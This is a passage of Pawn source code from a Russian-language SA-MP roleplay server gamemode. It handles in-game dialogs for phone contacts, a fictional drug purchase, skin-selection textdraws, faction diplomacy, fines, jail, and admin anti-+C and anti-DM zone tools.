				ShowPlayerDialog(playerid,341,DIALOG_STYLE_LIST,"Список контактов","Позвонить\nНаписать сообщение\n{F85A5A}Удалить контакт","Далее","Закрыть");
			}
			else
			{
			    query = "";
			    format(query, sizeof(query), "SELECT * FROM phone WHERE id1 = '%d' AND id > '%d'",PlayerInfo[playerid][pID],GetPVarInt(playerid,"CheckPlayer"));
				mysql_tquery(mysql, query, "ShowPhoneContakt", "d", playerid);
				DeletePVar(playerid,"CheckPlayer");
				
	   			/*format(query, sizeof(query), "SELECT * FROM phone WHERE id1 = '%d' AND id > '%d'",PlayerInfo[playerid][pID],GetPVarInt(playerid,"CheckPlayer"));
				mysql_tquery(mysql,query);
				mysql_store_result();
				DeletePVar(playerid,"CheckPlayer");
				if(mysql_num_rows() > 0)
				{
				    new srrt[1000],kek;
					strcat(srrt, "{FFFFFF}");
					new sos[16],sos1[16],sas,sos22[10];
					new str[50];
					for(new i = 0; i <= mysql_num_rows();i++)
					{
						if(mysql_fetch_row_format(query))
			   			{
							
							mysql_get_field("name", sos);
							mysql_get_field("num", sos1);
							sas = strval(sos1);
							
							format(str,sizeof(str),"Имя: %s | Номер: %i\n",sos,sas);
							strcat(srrt, str);
							ListNick[playerid][kek] = sas;
			    			kek++;
			    			if(kek >= 15)
							{
							    mysql_get_field("id", sos22);
							    SetPVarInt(playerid,"CheckPlayer",strval(sos22));
							    break;
							}

						}
					}


					mysql_free_result();
					if(GetPVarInt(playerid,"CheckPlayer")) strcat(srrt, "\nДалее >>");
					ShowPlayerDialog(playerid,340,DIALOG_STYLE_LIST,"Список контактов",srrt,"Закрыть","");
				}*/
			}
		}
		case 341:
		{
		    if(!response) return DeletePVar(playerid,"Nomer");
		    new string[10];
			valstr(string,GetPVarInt(playerid,"Nomer"));
		    if(listitem == 0) cmd_call(playerid,string);
		    else if(listitem == 1) ShowPlayerDialog(playerid,342,DIALOG_STYLE_INPUT,"Список контактов","{ffffff}Введите сообщение:","Далее","Закрыть");
			else
			{
			    query = "";
			    format(query, sizeof(query), "DELETE FROM phone WHERE id1 = '%d' AND phone = '%d'", PlayerInfo[playerid][pID],GetPVarInt(playerid,"Nomer"));
				mysql_tquery(mysql,query);
				SendClientMessage(playerid,-1,"Контакт удален");
			}
		}
		case 342:
		{
		    if(!response) return DeletePVar(playerid,"Nomer");
			if(strlen(inputtext) < 2|| strlen(inputtext) > 50) return ShowPlayerDialog(playerid,342,DIALOG_STYLE_INPUT,"Список контактов","{ffffff}Введите сообщение:","Далее","Закрыть");
			new string[70];
			format(string,sizeof(string),"%d %s",GetPVarInt(playerid,"Nomer"),inputtext);
			cmd_sms(playerid,string);
		}
		case 343:
		{
		    if(!response) return 1;
			if(strval(inputtext) < 1|| strval(inputtext) > 50) return ShowPlayerDialog(playerid,343,DIALOG_STYLE_INPUT,"Неизвестный","{ffffff}Сколько тебе надо:\n\nЗаказать можно от 1 до 50 гр.","Далее","Отмена");
			static const fmt_string1[] = "{FFFFFF}Цена:\t\t\t$%i\n\nВы согласны?";
			new str[sizeof(fmt_string1)+4];
			new cena;
			if(NarkSklad < 1000) cena = 25;
			else if(NarkSklad >= 1000 && NarkSklad < 5000) cena = 20;
			else if(NarkSklad > 5000) cena = 15;
			format(str, sizeof(str), fmt_string1,cena*strval(inputtext));
			SetPVarInt(playerid,"nrk",strval(inputtext));
			ShowPlayerDialog(playerid,344,DIALOG_STYLE_MSGBOX,"Незивестный",str,"Да","Отмена");
		}
		case 344:
		{
		    if(!response) return DeletePVar(playerid,"nrk");
		    new cena;
			if(NarkSklad < 1000) cena = 25;
			else if(NarkSklad >= 1000 && NarkSklad < 5000) cena = 20;
			else if(NarkSklad > 5000) cena = 15;
		    if(PlayerInfo[playerid][pCash] < cena*GetPVarInt(playerid,"nrk")) return SendClientMessage(playerid,CREWARD,">> [SMS]{FFFFFF} Неизвестно: Не пиши мне больше без денег | Телефон: 8395");
			GiveMoney(playerid,-cena*GetPVarInt(playerid,"nrk"));
			SmsDrugs(playerid,"Жди, скоро я отправлю координаты, где забрать");
			SetTimerEx("NarkoGo",10000,false,"dd",playerid,GetPVarInt(playerid,"nrk"));
			return DeletePVar(playerid,"nrk");
			
		}
		case 345:
		{
		    if(!response) return true;
		    SendClientMessage(playerid,CREWARD,"[Помощник]{ffffff} Для начала тебе нужно получить паспорт. Отправляйся в мэрию к столу выдачи.");
		    SendClientMessage(playerid,CREWARD,"[Помощник]{ffffff} Мэрию я отметил тебе на карте.");
		    PlayerInfo[playerid][pHelp] = 1;
      		SetPlayerRaceCheckpoint(playerid,2,1481.58,-1740.59,13.5469,0,0,0,10); //mayor
      		SetPVarInt(playerid,"GPS",1);
		    
		}
	
		case 347:
		{
		    if(!response) return 1;
		    new text[50];
      		switch(listitem)
		    {
		        case 0..9: format(text,sizeof(text),"SELECT SKIN FOR %d RANK",listitem+1);
		        case 10: text = "SELECT SKIN FOR WOMAN";
		    }
		    SetPVarInt(playerid,"SelectSkinRank",listitem);
		    
		    SkinsTD[playerid][0] = CreatePlayerTextDraw(playerid, 560.667114, 145.357803, "usebox");
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][0], 0.000000, 22.957410);
			PlayerTextDrawTextSize(playerid, SkinsTD[playerid][0], 51.777751, 0.000000);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][0], 1);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][0], 0);
			PlayerTextDrawUseBox(playerid, SkinsTD[playerid][0], true);
			PlayerTextDrawBoxColor(playerid, SkinsTD[playerid][0], 102);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][0], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][0], 0);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][0], 0);

			SkinsTD[playerid][1] = CreatePlayerTextDraw(playerid, 54.222389, 144.355621, "New Textdraw");
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][1], 0.449999, 1.600000);
			PlayerTextDrawTextSize(playerid, SkinsTD[playerid][1], 84.444450, 104.035545);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][1], 1);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][1], -1);
			PlayerTextDrawUseBox(playerid, SkinsTD[playerid][1], true);
			PlayerTextDrawBoxColor(playerid, SkinsTD[playerid][1], 0);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][1], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][1], 1);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][1], 5);
			PlayerTextDrawSetProportional(playerid, SkinsTD[playerid][1], 1);
			PlayerTextDrawSetSelectable(playerid, SkinsTD[playerid][1], true);

			SkinsTD[playerid][2] = CreatePlayerTextDraw(playerid, 138.333480, 145.853500, "New Textdraw");
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][2], 0.449999, 1.600000);
			PlayerTextDrawTextSize(playerid, SkinsTD[playerid][2], 84.444450, 104.035545);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][2], 1);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][2], -1);
			PlayerTextDrawUseBox(playerid, SkinsTD[playerid][2], true);
			PlayerTextDrawBoxColor(playerid, SkinsTD[playerid][2], 0);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][2], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][2], 1);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][2], 5);
			PlayerTextDrawSetProportional(playerid, SkinsTD[playerid][2], 1);
			PlayerTextDrawSetSelectable(playerid, SkinsTD[playerid][2], true);

			SkinsTD[playerid][3] = CreatePlayerTextDraw(playerid, 222.000335, 145.857910, "New Textdraw");
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][3], 0.449999, 1.600000);
			PlayerTextDrawTextSize(playerid, SkinsTD[playerid][3], 84.444450, 104.035545);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][3], 1);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][3], -1);
			PlayerTextDrawUseBox(playerid, SkinsTD[playerid][3], true);
			PlayerTextDrawBoxColor(playerid, SkinsTD[playerid][3], 0);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][3], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][3], 1);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][3], 5);
			PlayerTextDrawSetProportional(playerid, SkinsTD[playerid][3], 1);
			PlayerTextDrawSetSelectable(playerid, SkinsTD[playerid][3], true);

			SkinsTD[playerid][4] = CreatePlayerTextDraw(playerid, 305.222259, 145.862350, "New Textdraw");
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][4], 0.449999, 1.600000);
			PlayerTextDrawTextSize(playerid, SkinsTD[playerid][4], 84.444450, 104.035545);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][4], 1);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][4], -1);
			PlayerTextDrawUseBox(playerid, SkinsTD[playerid][4], true);
			PlayerTextDrawBoxColor(playerid, SkinsTD[playerid][4], 0);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][4], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][4], 1);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][4], 5);
			PlayerTextDrawSetProportional(playerid, SkinsTD[playerid][4], 1);
			PlayerTextDrawSetSelectable(playerid, SkinsTD[playerid][4], true);

			SkinsTD[playerid][5] = CreatePlayerTextDraw(playerid, 389.333038, 146.364608, "New Textdraw");
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][5], 0.449999, 1.600000);
			PlayerTextDrawTextSize(playerid, SkinsTD[playerid][5], 84.444450, 104.035545);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][5], 1);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][5], -1);
			PlayerTextDrawUseBox(playerid, SkinsTD[playerid][5], true);
			PlayerTextDrawBoxColor(playerid, SkinsTD[playerid][5], 0);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][5], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][5], 1);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][5], 5);
			PlayerTextDrawSetProportional(playerid, SkinsTD[playerid][5], 1);
			PlayerTextDrawSetSelectable(playerid, SkinsTD[playerid][5], true);

			SkinsTD[playerid][6] = CreatePlayerTextDraw(playerid, 473.444458, 145.373489, "New Textdraw");
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][6], 0.449999, 1.600000);
			PlayerTextDrawTextSize(playerid, SkinsTD[playerid][6], 84.444450, 104.035545);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][6], 1);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][6], -1);
			PlayerTextDrawUseBox(playerid, SkinsTD[playerid][6], true);
			PlayerTextDrawBoxColor(playerid, SkinsTD[playerid][6], 0);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][6], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][6], 1);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][6], 5);
			PlayerTextDrawSetProportional(playerid, SkinsTD[playerid][6], 1);
			PlayerTextDrawSetSelectable(playerid, SkinsTD[playerid][6], true);

			SkinsTD[playerid][7] = CreatePlayerTextDraw(playerid, 53.555568, 247.920227, "New Textdraw");
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][7], 0.449999, 1.600000);
			PlayerTextDrawTextSize(playerid, SkinsTD[playerid][7], 84.444450, 104.035545);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][7], 1);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][7], -1);
			PlayerTextDrawUseBox(playerid, SkinsTD[playerid][7], true);
			PlayerTextDrawBoxColor(playerid, SkinsTD[playerid][7], 0);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][7], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][7], 1);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][7], 5);
			PlayerTextDrawSetProportional(playerid, SkinsTD[playerid][7], 1);
			PlayerTextDrawSetSelectable(playerid, SkinsTD[playerid][7], true);

			SkinsTD[playerid][8] = CreatePlayerTextDraw(playerid, 137.666656, 247.924667, "New Textdraw");
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][8], 0.449999, 1.600000);
			PlayerTextDrawTextSize(playerid, SkinsTD[playerid][8], 84.444450, 104.035545);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][8], 1);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][8], -1);
			PlayerTextDrawUseBox(playerid, SkinsTD[playerid][8], true);
			PlayerTextDrawBoxColor(playerid, SkinsTD[playerid][8], 0);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][8], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][8], 1);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][8], 5);
			PlayerTextDrawSetProportional(playerid, SkinsTD[playerid][8], 1);
			PlayerTextDrawSetSelectable(playerid, SkinsTD[playerid][8], true);

			SkinsTD[playerid][9] = CreatePlayerTextDraw(playerid, 221.777786, 248.426895, "New Textdraw");
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][9], 0.449999, 1.600000);
			PlayerTextDrawTextSize(playerid, SkinsTD[playerid][9], 84.444450, 104.035545);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][9], 1);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][9], -1);
			PlayerTextDrawUseBox(playerid, SkinsTD[playerid][9], true);
			PlayerTextDrawBoxColor(playerid, SkinsTD[playerid][9], 0);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][9], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][9], 1);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][9], 5);
			PlayerTextDrawSetProportional(playerid, SkinsTD[playerid][9], 1);
			PlayerTextDrawSetSelectable(playerid, SkinsTD[playerid][9], true);

			SkinsTD[playerid][10] = CreatePlayerTextDraw(playerid, 305.889129, 249.426849, "New Textdraw");
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][10], 0.449999, 1.600000);
			PlayerTextDrawTextSize(playerid, SkinsTD[playerid][10], 84.444450, 104.035545);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][10], 1);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][10], -1);
			PlayerTextDrawUseBox(playerid, SkinsTD[playerid][10], true);
			PlayerTextDrawBoxColor(playerid, SkinsTD[playerid][10], 0);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][10], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][10], 1);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][10], 5);
			PlayerTextDrawSetProportional(playerid, SkinsTD[playerid][10], 1);
			PlayerTextDrawSetSelectable(playerid, SkinsTD[playerid][10], true);

			SkinsTD[playerid][11] = CreatePlayerTextDraw(playerid, 390.444549, 249.929031, "New Textdraw");
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][11], 0.449999, 1.600000);
			PlayerTextDrawTextSize(playerid, SkinsTD[playerid][11], 84.444450, 104.035545);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][11], 1);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][11], -1);
			PlayerTextDrawUseBox(playerid, SkinsTD[playerid][11], true);
			PlayerTextDrawBoxColor(playerid, SkinsTD[playerid][11], 0);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][11], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][11], 1);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][11], 5);
			PlayerTextDrawSetProportional(playerid, SkinsTD[playerid][11], 1);
			PlayerTextDrawSetSelectable(playerid, SkinsTD[playerid][11], true);

			SkinsTD[playerid][12] = CreatePlayerTextDraw(playerid, 474.110992, 249.435699, "New Textdraw");
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][12], 0.449999, 1.600000);
			PlayerTextDrawTextSize(playerid, SkinsTD[playerid][12], 84.444450, 104.035545);
			PlayerTextDrawBackgroundColor(playerid, SkinsTD[playerid][12], 0x00000000);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][12], 1);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][12], -1);
			PlayerTextDrawUseBox(playerid, SkinsTD[playerid][12], true);
			PlayerTextDrawBoxColor(playerid, SkinsTD[playerid][12], 0);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][12], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][12], 1);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][12], 5);
			PlayerTextDrawSetProportional(playerid, SkinsTD[playerid][12], 1);
			PlayerTextDrawSetSelectable(playerid, SkinsTD[playerid][12], true);

			SkinsTD[playerid][13] = CreatePlayerTextDraw(playerid, 300.444305, 129.422225, text);
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][13], 0.250000, 1.161955);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][13], 2);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][13], -1);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][13], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][13], 0);
			PlayerTextDrawBackgroundColor(playerid, SkinsTD[playerid][13], 0x00000000);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][13], 2);
			PlayerTextDrawSetProportional(playerid, SkinsTD[playerid][13], 1);

			SkinsTD[playerid][14] = CreatePlayerTextDraw(playerid, 398.888916, 129.926651, "usebox");
			PlayerTextDrawLetterSize(playerid, SkinsTD[playerid][14], 0.000000, 1.287284);
			PlayerTextDrawTextSize(playerid, SkinsTD[playerid][14], 207.333312, 0.000000);
			PlayerTextDrawAlignment(playerid, SkinsTD[playerid][14], 1);
			PlayerTextDrawColor(playerid, SkinsTD[playerid][14], 0);
			PlayerTextDrawUseBox(playerid, SkinsTD[playerid][14], true);
			PlayerTextDrawBoxColor(playerid, SkinsTD[playerid][14], 102);
			PlayerTextDrawSetShadow(playerid, SkinsTD[playerid][14], 0);
			PlayerTextDrawSetOutline(playerid, SkinsTD[playerid][14], 0);
			PlayerTextDrawFont(playerid, SkinsTD[playerid][14], 0);
			
			PlayerTextDrawShow(playerid,SkinsTD[playerid][0]);
			PlayerTextDrawShow(playerid,SkinsTD[playerid][14]);
            PlayerTextDrawShow(playerid,SkinsTD[playerid][13]);
            new info;
            switch(PlayerInfo[playerid][pMember])
			{
			    case 1: info = 8;
			    case 2: info = 6;
			    case 3: info = 8;
			    case 4: info = 7;
			    case 5: info = 4;
			    case 6: info = 6;
			    case 7: info = 5;
			    case 8: info = 6;
			    case 9: info = 6;
			    case 10: info = 6;
			    case 11: info = 5;
			    case 12: info = 7;
			    case 13: info = 9;
			    case 14: info = 7;
			    case 15: info = 5;
			    case 16: info = 5;
			    case 17: info = 6;
			}
            for(new i = 1; i <= info; i++)
            {
				PlayerTextDrawBackgroundColor(playerid, SkinsTD[playerid][i], 0x00000000);
				PlayerTextDrawSetPreviewModel(playerid,SkinsTD[playerid][i], ManSkinFrack[PlayerInfo[playerid][pMember]-1][i-1]);
				PlayerTextDrawSetPreviewRot(playerid,SkinsTD[playerid][i], 0.000000, 0.000000, 0.000000, 1.000000);
                PlayerTextDrawShow(playerid,SkinsTD[playerid][i]);
            }
            SetPVarInt(playerid,"AntiClick",gettime()+2);
            SelectTextDraw(playerid, 0xAFAFAFAA);
			

		}
		case 348:
		{
		    if(!response) return 1;
		    ShowPlayerDialog(playerid,349,DIALOG_STYLE_LIST,"Изменить дипломатию","Нейтрал\nМир\nВойна","Далее","Отмена");
		    SetPVarInt(playerid,"OrgID",ListNick[playerid][listitem]);
		}
		case 349:
		{
		    if(!response) return DeletePVar(playerid,"OrgID");
			new org = GetPVarInt(playerid,"OrgID")-6;
			DiploInfo[PlayerInfo[playerid][pMember]-6][GetPVarInt(playerid,"OrgID")] = listitem;
			DiploInfo[GetPVarInt(playerid,"OrgID")][PlayerInfo[playerid][pMember]-6] = listitem;
			query = "";
			format(query, sizeof(query), "UPDATE `dipl` SET `%d` = '%d' WHERE id = '%d' LIMIT 1",org,listitem,PlayerInfo[playerid][pMember]);
			mysql_tquery(mysql,query);
			query = "";
			format(query, sizeof(query), "UPDATE `dipl` SET `%d` = '%d' WHERE id = '%d' LIMIT 1",PlayerInfo[playerid][pMember],listitem,org);
			mysql_tquery(mysql,query);
			static const fmt_string[] = "[F] %s изменил дипломатию: %s & %s - %s";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+25];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracInfo[PlayerInfo[playerid][pMember]][fName],FracInfo[org][fName],DiploCheck[listitem]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			SendFMes(org,COLOR_SKLAD,str);
			cmd_diplo(playerid,"");
			DeletePVar(playerid,"OrgID");
		}
		case 350:
		{
			if(!response) return true;
			switch(listitem)
			{
			    case 0:
			    {
			        
				   	if(PlayerInfo[playerid][pShtrav] > 0)
				   	{
			 			static const fmt_string[] = "{FFFFFF}Вы действительно хотите оплатить все штрафы?\nЦена: $%i";
						new str[sizeof(fmt_string)+20];
						format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pShtrav]);
						ShowPlayerDialog(playerid,133,DIALOG_STYLE_MSGBOX,"Оплата штрафов",str,"Да","Нет");
				   	}
				   	else
				   	{
				   	    ApplyDynamicActorAnimation(PoliceBot[GetBotPD(playerid)],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
						Update3DTextLabelTextEx(PoliceText[GetBotPD(playerid)],-1,"У Вас нет неоплаченных штрафов");
						SetTimerEx("ClearBotGlobal", 3000, false,"dd",PoliceBot[GetBotPD(playerid)],_:PoliceText[GetBotPD(playerid)]);
				   	}
			    }
			    case 1:
			    {
			        if(!PlayerInfo[playerid][pWanted]) return SendClientMessage(playerid,CGREY,"Вы не в розыске!");
			        ShowPlayerDialog(playerid,351,DIALOG_STYLE_MSGBOX,"Сдаться с повинной","{ffffff}Вы действительно хотите сдаться с повинной?\nПосле согласия вы будете направлены в тюрьму!","Далее","Отмена");
			    }
			}
		}
		case 351:
		{
		    if(!response) return true;
		    if(!PlayerInfo[playerid][pWanted]) return SendClientMessage(playerid,CGREY,"Вы не в розыске!");
		    PlayerInfo[playerid][pJail] = 1;
		    PlayerInfo[playerid][pJailTime] = (PlayerInfo[playerid][pWanted]*60*6)/2;
		    SetPVarInt(playerid,"Freeze",1);
			SetPlayerPos(playerid,JailPos[random(16)][0],JailPos[random(16)][1],JailPos[random(16)][2]);
			SetPlayerFacingAngle(playerid,JailPos[random(16)][3]);
			SetPlayerInterior(playerid,1);
			SetPlayerVirtualWorld(playerid, 1);
		    SetPlayerWantedLevel(playerid,0);
		    PlayerInfo[playerid][pWanted] = 0;
		    PlayerInfo[playerid][pAr]++;
			DeletePVar(playerid,"Progulka");
			SendClientMessage(playerid,-1,"Вы были направлены в тюрьму!");
		}
		case 352:
		{
		    if(!response) return true;
		    switch(listitem)
			{
				case 0:  CloseWare(playerid);
				case 1:
				{
					static const fmt_string1[] = "{ffffff}Склад LSPD: %d шт.\nСклад LVPD: %d шт.\nСклад FBI: %d шт.";
					new str1[sizeof(fmt_string1)+10];
					format(str1, sizeof(str1), fmt_string1,FracMats[F_LSPD],FracMats[F_LVPD],FracMats[F_FBI]);
					ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Информация",str1,"Далее","");
				}
			}
		}
		case 353:
		{
		    if(!response) return 1;
			new code2[17];
			GetPVarString(playerid, "Ips", code2, sizeof(code2));
			cmd_banip(playerid,code2);
			DeletePVar(playerid,"Ips");
		}
		case 354:
		{
		    if(!response) return 1;
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid,355,DIALOG_STYLE_INPUT,"Анти +С","{ffffff}Введите ID игрока:\n\n","Далее","Назад");
				case 1: ShowPlayerDialog(playerid,356,DIALOG_STYLE_INPUT,"Анти +С","{ffffff}Введите радиус и статус:\n1 - Запретить\n2 - Разрешить\n\nНапример: 30,1","Далее","Назад");
				case 2:
				{
					new text[30];
				    text = (!antic) ? ("разрешил") : ("запретил");
				    antic = (!antic) ? (1) : (0);
				    for(new i = 0; i < MAX_PLAYERS; i++)
					{
					    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
						SetPVarInt(i,"AntiC",antic);
					}
			        static const fmt_string[] = "Администратор %s %s всем использование +С";
					new str[sizeof(fmt_string)+MAX_PLAYER_NAME+20];
					format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],text);
					SendAdminToAll(COLOR_LIGHTRED,str);

				}
			}
		}
		case 355:
		{
			if(!response) return 1;
			if(!strval(inputtext) || strval(inputtext) < 0 || strval(inputtext) > 999) return ShowPlayerDialog(playerid,355,DIALOG_STYLE_INPUT,"Анти +С","{ffffff}Введите ID игрока:\n\n","Далее","Назад");
			new to = strval(inputtext);
			if(!IsPlayerConnected(to) || PlayerLogged[to] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
		 	new text[30];
		 	text = (!GetPVarInt(to,"AntiC")) ? ("разрешил") : ("запретил");
		 	SetPVarInt(to,"AntiC",(!GetPVarInt(to,"AntiC")) ? (1):(0));
		    static const fmt_string[] = "%s %s Вам использовать +С";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+20];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],text);
			SendClientMessage(to, CREWARD, str);
			static const fmt_string32[] = "[A] %s %s %s использовать +С";
			new str32[sizeof(fmt_string32)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+20];
			format(str32, sizeof(str32), fmt_string32,PlayerInfo[playerid][pSendername],text,PlayerInfo[to][pSendername]);
			SendAdminMessage(CGREY,str32);
		}
		case 356:
		{
		    if(!response) return 1;
		    new rad,status;
	        if(sscanf(inputtext, "p<,>dd",rad,status) || rad < 1 || rad > 40000 || status < 1 || status > 2 ) return  ShowPlayerDialog(playerid,356,DIALOG_STYLE_INPUT,"Анти +С","{ffffff}Введите радиус и статус:\n1 - Запретить\n2 - Разрешить\n\nНапример: 30,1","Далее","Назад");
		//	if(!strval(inputtext) || strval(inputtext) < 1 || strval(inputtext) > 40000) return ShowPlayerDialog(playerid,356,DIALOG_STYLE_INPUT,"Анти +С","{ffffff}Введите радиус и статус:\n1 - Разрешить\n2 - Запретить\n\nНапример: 30,1","Далее","Назад");
            new text[30];
			text = (status == 1) ? ("запретил") : ("разрешил");
			static const fmt_string[] = "%s %s Вам использовать +С";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+20];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],text);
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
			    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
				if(GetDistanceBetweenPlayers(playerid,i) < rad)
				{
					SetPVarInt(i,"AntiC",status - 1);
					SendClientMessage(i, CREWARD, str);
				}

			}
			static const fmt_string32[] = "[A] %s %s использовать +С в радиусе %d метров";
			new str32[sizeof(fmt_string32)+MAX_PLAYER_NAME+30];
			format(str32, sizeof(str32), fmt_string32,PlayerInfo[playerid][pSendername],text,rad);
			SendAdminMessage(CGREY,str32);
		    
		}
		case 357:
		{
			if(!response) return 1;
			if(!listitem)
			{
			    ShowPlayerDialog(playerid,360,DIALOG_STYLE_INPUT,"Anti DM","{ffffff}Введите название и радиус через запятую:\n\nНапример: Мэрия, 30","Далее","Назад");
			}
			else
			{
				SetPVarInt(playerid,"CheckAntiDM",ListNick[playerid][listitem-1]);
				ShowPlayerDialog(playerid,358,DIALOG_STYLE_LIST,"Anti DM","Изменить радиус\nУдалить","Далее","Назад");
			}
		}
		case 358:
		{
		    if(!response)
			{
			    DeletePVar(playerid,"CheckAntiDM");
			    cmd_antidm(playerid);
				return 1;
			}
			switch(listitem)
			{
			    case 0: ShowPlayerDialog(playerid,359,DIALOG_STYLE_INPUT,"Anti DM","{ffffff}Введите новый радиус:\n\n","Далее","Назад");
			    case 1:
			    {
			        new zone = GetPVarInt(playerid,"CheckAntiDM");
			        static const fmt_string32[] = "[A] %s удалил Anti DM зону %s";
					new str32[sizeof(fmt_string32)+MAX_PLAYER_NAME+30];
					format(str32, sizeof(str32), fmt_string32,PlayerInfo[playerid][pSendername],AntiDM[zone][admName]);
					SendAdminMessage(CGREY,str32);
					query = "";
			        format(query, sizeof(query), "DELETE FROM antidm WHERE name = '%s'", AntiDM[zone][admName]);
					mysql_tquery(mysql,query);
					AntiDM[zone][admV] = 0;
					AntiDM[zone][admI] = 0;
					AntiDM[zone][admX] = 0.0;
					AntiDM[zone][admY] = 0.0;
					AntiDM[zone][admZ] = 0.0;
					AntiDM[zone][admRad] = 0;
					strmid(AntiDM[zone][admName], "", 0, 0, 0);
					SendClientMessage(playerid,CREWARD,"Вы удалили Anti DM зону!");
					DestroyDynamicArea(AntiDM[zone][admSP]);
					AntiDM[zone][admSP] = 0;
					DeletePVar(playerid,"CheckAntiDM");
					
			    }
			}
		}
		case 359:
		{
		    if(!response)
			{
			    DeletePVar(playerid,"CheckAntiDM");
			    cmd_antidm(playerid);
				return 1;
			}
			if(!strval(inputtext) || strval(inputtext) < 1 || strval(inputtext) > 40000) return ShowPlayerDialog(playerid,359,DIALOG_STYLE_INPUT,"Anti DM","{ffffff}Введите новый радиус:\n\n","Далее","Назад");
